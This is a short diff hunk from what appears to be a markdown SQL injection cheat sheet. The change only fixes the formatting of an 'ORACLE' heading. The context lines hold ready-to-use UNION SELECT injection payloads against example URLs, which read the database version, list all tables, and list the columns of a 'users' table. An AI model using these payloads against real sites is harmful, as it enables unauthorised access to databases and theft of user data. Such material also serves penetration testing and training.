@@ -144,7 +144,7 @@ https://www.example.com/products?id=2' UNION SELECT NULL,@@version_compile_machi
 
 ## Dumping all Tables and data
 
-**ORACLE **
+**ORACLE**
 ```
 https://www.example.com/products?id=2' UNION SELECT NULL,TABLE_NAME,NULL from all_tables -- -
 https://www.example.com/products?id=2' UNION SELECT NULL,COLUMN_NAME,NULL from all_tab_columns where table_name = 'users'
